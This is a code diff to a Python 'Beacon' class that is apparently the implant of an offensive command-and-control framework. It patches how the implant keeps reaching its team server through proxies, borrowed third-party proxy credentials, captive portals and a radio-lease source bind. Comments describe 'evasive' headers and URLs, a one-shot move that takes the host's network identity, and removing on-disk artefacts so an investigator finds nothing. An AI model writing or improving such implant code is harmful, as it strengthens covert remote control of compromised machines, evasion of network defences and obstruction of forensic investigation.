@@ -6515,13 +6515,25 @@ class Beacon:
                                    if self._way_out_enabled else "")
         # The radio rung's leased address, while it holds one: every
         # socket this implant opens is bound to it, which is what makes
-        # the rung's `ip rule from <address>` match. Cleared by a leg
-        # delivering and by a rollback.
+        # the rung's `ip rule from <address>` match. Cleared by a
+        # rollback, and **not** by a leg delivering -- see
+        # `_leg_recovered` for why that was a defect. `_bound_session` is
+        # the one place that reads it.
         self._way_out_source = ""
-        # Rung 4's latch. Once per deployment, and deliberately **not**
-        # reset by `_leg_recovered`: it is the one move here that cannot be
-        # undone from the far side, so a second outage does not get a
-        # second attempt at it. Re-arming it is a new deployment.
+        # Rung 4's latch, as this process remembers it. Once per
+        # deployment, and deliberately **not** reset by `_leg_recovered`:
+        # it is the one move here that cannot be undone from the far side,
+        # so a second outage does not get a second attempt at it.
+        # Re-arming it is a new deployment.
+        #
+        # The memory is not the latch, though, and that was the defect:
+        # this unit carries `Restart=always`, so a flag that started at
+        # False re-armed the one move the operator page says in bold can
+        # end this implant's connectivity for good, on every restart.
+        # `_egress_identity` reads the request file it wrote -- the
+        # durable record, the same way `_way_out_publish_state` adopts a
+        # window's spent budget rather than refilling it -- and this flag
+        # is what still refuses when that write could not be made at all.
         self._way_out_identity_spent = False
 
         # ── the egress decider ──
@@ -6990,7 +7002,7 @@ class Beacon:
         HTTPS, and an operator would chase a callback URL that is working
         perfectly.
         """
-        session = self._proxy_session or _HttpSession()
+        session = self._proxy_session or self._bound_session()
         if self._is_loopback_base(base):
             # A forward on this host is never reached through a proxy. The
             # leg that passes a loopback base exists for the network where
@@ -7000,6 +7012,10 @@ class Beacon:
             # request to a proxy that cannot reach `127.0.0.1`, and the
             # leg would never work. `trust_env` off for the same reason:
             # `http_proxy` in the implant's environment would do it too.
+            #
+            # And bare rather than `_bound_session`, which is the one place
+            # that is deliberate: a connection to `127.0.0.1` from the
+            # radio rung's leased address cannot be made at all.
             session = _HttpSession()
             session.trust_env = False
         hdrs = self._post_headers() if endpoint == "result" else self._evasive_headers()
@@ -7032,7 +7048,10 @@ class Beacon:
             # status code is actually known.
             self._record_leg(transport, _rescue_class_of(e))
             try:
-                direct = _HttpSession()
+                # Through `_bound_session`, so a retry that bypasses the
+                # proxy does not also bypass the radio rung's source bind
+                # and leave by the dead tapped port.
+                direct = self._bound_session()
                 direct.trust_env = False
                 resp = direct.post(
                     self._evasive_url(endpoint, base),
@@ -7215,18 +7234,24 @@ class Beacon:
         reopened already spent would be an implant that had quietly
         stopped deciding -- and the one caller of this is the one arm of
         `_beacon_loop` where an upstream leg delivered.
+
+        **The radio rung's source binding is not among them**, and that is
+        a correction rather than an omission. A leg delivering while the
+        bind holds is the moment that rung is *working*: the traffic left
+        by the leased address and took table 100. Dropping it here put the
+        next cycle back out of the dead tapped port with `_stuck_cycles`
+        reset to zero -- so the implant had to climb five hours again to
+        re-run the rung, for ever, one delivering cycle per climb. A bind
+        that has gone wrong is still re-decided: the implant goes dark,
+        climbs to rung 3 again, and `_egress_radio` either re-associates
+        or rolls back, and the rollback is where the unbind belongs.
         """
         self._rescue_sent = False
         self._rescue_answered = False
         self._stuck_cycles = 0
         self._egress_spent = 0
-        # The radio rung's source binding goes with them: the window is
-        # over, so the implant's sockets go back to the kernel's choice
-        # of address rather than staying pinned to a lease from an outage
-        # that has ended.
-        self._way_out_bind("")
-        # And the one file this project puts on the disk goes with them:
-        # the window is over, so the artefact that described it is removed
+        # The one file this project puts on the disk goes with them: the
+        # window is over, so the artefact that described it is removed
         # rather than left for the next reader -- or the next investigator
         # -- to find. Raises nothing.
         self._way_out_clear_state()
@@ -10042,7 +10067,7 @@ class Beacon:
         # The verb honours the instruction it was given rather than
         # second-guessing it, and `proxyinfo` still reports the relay,
         # which is where an operator sees what they did.
-        session = _HttpSession()
+        session = self._bound_session()
         self._proxy_session = session
         session.proxies = self._proxy.get_urllib_proxies() or {}
         return ("Proxy selected: %s (%s)%s. Not a test of it: the next "
@@ -10185,7 +10210,7 @@ class Beacon:
         # the reason `_egress_select_proxy` gives: `_https_post` reads
         # `_proxy_session` once into a local, so swapping the object cannot
         # change an opener a request is in the middle of building.
-        session = _HttpSession()
+        session = self._bound_session()
         self._proxy_session = session
         session.proxies = {"http": url, "https": url}
         session.headers["Proxy-Authorization"] = "Basic " + token
@@ -10219,7 +10244,7 @@ class Beacon:
                     "Nothing was changed." % (portal,))
         content_type = portal.get("content_type") or \
             "application/x-www-form-urlencoded"
-        session = self._proxy_session or _HttpSession()
+        session = self._proxy_session or self._bound_session()
         try:
             response = session.post_raw(
                 url, body.encode("utf-8"),
@@ -10466,14 +10491,45 @@ class Beacon:
         change an opener a request is in the middle of building.
         """
         self._way_out_source = address or ""
-        session = _HttpSession()
+        session = self._bound_session()
         previous = self._proxy_session
         if previous is not None:
             session.proxies = dict(previous.proxies)
             session.headers = dict(previous.headers)
             session.trust_env = previous.trust_env
-        session.source_address = (address, 0) if address else None
         self._proxy_session = session
+
+    def _bound_session(self) -> "_HttpSession":
+        """A fresh HTTP session that still leaves by the leased address.
+
+        The invariant `_way_out_bind` installs has exactly one owner, and
+        this is it: **while the radio rung holds a lease, every socket this
+        implant opens for its own traffic leaves by that address.** Five
+        places build a fresh session -- a proxy selected, a credential
+        borrowed, a portal answered with no session yet, a direct retry
+        after a proxy refused us, and the startup path -- and each of them
+        set the one or two fields it cared about on a bare `_HttpSession`.
+        Three of the five therefore dropped `source_address` silently,
+        while `_way_out_source` went on claiming the bind and the rung's
+        own log line went on saying "this implant's own traffic only": HTTP
+        left by the dead tapped port, which is the failure the rung exists
+        to end.
+
+        Only the source address, and nothing else of the old session: the
+        callers that reach for this are switching the path out, the cookie
+        jar is state from the path being left behind, and `headers` may
+        hold a third party's `Proxy-Authorization` -- which a direct retry
+        must not carry to the team server. A field that must survive a
+        path switch belongs here, where adding it reaches all five.
+
+        The one deliberate exception is the loopback forward in
+        `_https_post`, which builds a bare session: a connection to
+        `127.0.0.1` from a radio lease's address cannot be made at all.
+        """
+        session = _HttpSession()
+        if self._way_out_source:
+            session.source_address = (self._way_out_source, 0)
+        return session
 
     def _radio_lease_address(self, already) -> List[str]:
         """The address a previous attempt's lease named, if it is still there.
@@ -10505,11 +10561,20 @@ class Beacon:
         not get retried on a hunch, however the arithmetic looks on the next
         cycle, and `_leg_recovered` deliberately does not re-arm it.
 
+        **And one-shot across restarts of this process**, which is what the
+        request file on the disk is for. The flag below starts from that
+        file rather than from False, and this reads it again before writing:
+        the record carries `taken` and `detail` once `main.py` has acted,
+        which is the only durable statement that the bypass was started, so
+        a second request must not overwrite it.
+
         **Pre-spent when the operator already enabled the bypass**: the
         identity was taken at boot, and offering the rung again would spend
         an attempt on something already done.
         """
-        if self._way_out_identity_spent:
+        if self._way_out_identity_spent or self._way_out_read(
+                _WAY_OUT_IDENTITY_NAME, _WAY_OUT_STATE_VERSION) is not None:
+            self._way_out_identity_spent = True
             return ("[error] Not taking the host's identity: this implant "
                     "has asked once already, and the rung is once per "
                     "deployment -- it is the one move that can end this "
@@ -10707,18 +10772,20 @@ class Beacon:
             # When this window opened, kept across cycles so the scout
             # reads one timestamp rather than inferring it from a count.
             "opened": existing.get("opened") or time.time(),
+            # When this was last written, which is how the scout tells a
+            # week-long outage from a beacon that died with its window
+            # file still on the disk. Without it a dead beacon left the
+            # scout capturing and scanning the radio for ever.
+            "touched": time.time(),
             "stuck_cycles": self._stuck_cycles,
             "hours_dark": self._way_out_hours_dark(),
             "evidence": self._egress_state(),
             "spent": self._egress_spent,
             "budget": self._egress_budget,
-            # The attempts of *this* window, which the trail beside this
-            # file also carries -- see `_way_out_record_attempt`.
-            "attempts": existing.get("attempts") or [],
         })
 
     def _way_out_record_attempt(self, attempt: dict) -> None:
-        """Record one attempt: in the open window, and on the trail.
+        """Record one attempt: on the trail, and spend it in the window.
 
         **The trail is written here**, and it was the scout's. The scout
         copied new lines from the window's file on its own publishing
@@ -10729,6 +10796,15 @@ class Beacon:
         This process is the only one that knows an attempt was made, it is
         already writing in that directory, and the trail is append-only,
         so a restart of either side is harmless.
+
+        **The window's file keeps the count and not the attempts.** It
+        carried a growing list of every entry as well, which nothing read
+        -- the scout takes `evidence` and the model takes the same -- and
+        which the whole file is rewritten with on every attempt. There is
+        no upper bound on `budget`, so an operator who wrote a large one
+        had a file that grew by a full attempt record, rewritten each
+        time, for the length of the outage. `spent` is what a restarted
+        beacon needs from it; the trail beside it is the record.
 
         Raises nothing. A trail that cannot be written costs the record
         and not the attempt: the attempt is in this beacon's log either
@@ -10742,9 +10818,6 @@ class Beacon:
                                    _WAY_OUT_STATE_VERSION)
         if state is not None:
             entry.setdefault("window", state.get("opened"))
-            attempts = list(state.get("attempts") or [])
-            attempts.append(entry)
-            state["attempts"] = attempts
             state["spent"] = self._egress_spent
             self._way_out_write(_WAY_OUT_STATE_NAME, state)
         self._way_out_append_trail(entry)
@@ -11370,7 +11443,7 @@ class Beacon:
         if self._egress_spent >= self._egress_budget:
             return False
         state = self._egress_state()
-        chosen = numbers = None
+        chosen = numbers = task = None
         # **Every candidate, not only the first.** The gate used to end the
         # cycle the moment it refused whatever was chosen, so one loud
         # rule -- or a model that keeps naming `identity`, which this
@@ -11378,10 +11451,22 @@ class Beacon:
         # quieter rule below it for hours. A rung the arithmetic refuses
         # costs nothing, so the next candidate gets the cycle: that is
         # what "the beacon degrades to the policy" has to mean to be true.
+        #
+        # And the same for a candidate that *declines* -- `_egress_task`
+        # returning None, which is the rule holding with nothing on this
+        # host for it to work on. It is resolved inside this walk for that
+        # reason: resolved after it, a `proxy` rule on a host where
+        # discovery has found nothing ended the cycle, so the `rediscover`
+        # rule under it -- the one that would have given it a candidate --
+        # was never reached.
         for candidate in self._egress_candidates(state):
             allowed, priced = self._way_out_allows(
                 candidate["verb"], candidate.get("p_success"))
             if allowed:
+                task = self._egress_task(candidate["verb"],
+                                         candidate.get("argument") or "")
+                if task is None:
+                    continue
                 chosen, numbers = candidate, priced
                 break
             logger.warning(
@@ -11391,12 +11476,9 @@ class Beacon:
                 "this cycle is tried instead",
                 candidate["chose"], candidate["verb"], self._stuck_cycles,
                 priced["why"])
-        if chosen is None:
+        if chosen is None or task is None:
             return False
         verb = chosen["verb"]
-        task = self._egress_task(verb, chosen.get("argument") or "")
-        if task is None:
-            return False
 
         # Spent before the attempt and not after, so that whatever the
         # verb does -- including raising -- this window is one attempt
@@ -11423,9 +11505,9 @@ class Beacon:
             self._stuck_cycles, chosen["chose"], task, chosen["why"],
             ", allowed by " + numbers["why"] if numbers.get("row") else "",
             self._egress_spent, self._egress_budget, outcome)
-        # The trail's line, into the window's own file. It outlives this
-        # window: the scout copies it onto `way_out_trail`, which is what
-        # makes a burned implant a lesson instead of a mystery.
+        # The trail's line, into the window's own file and onto the trail
+        # itself. The trail outlives this window: it is what makes a
+        # burned implant a lesson instead of a mystery.
         self._way_out_record_attempt({
             "chose": chosen["chose"],
             "rule": chosen["rule"],
@@ -12537,7 +12619,7 @@ class Beacon:
                 self._jittered_sleep()
 
     def _init_proxy(self):
-        self._proxy_session = _HttpSession()
+        self._proxy_session = self._bound_session()
 
         if self.proxy_mode == "none":
             self._proxy_session.trust_env = False
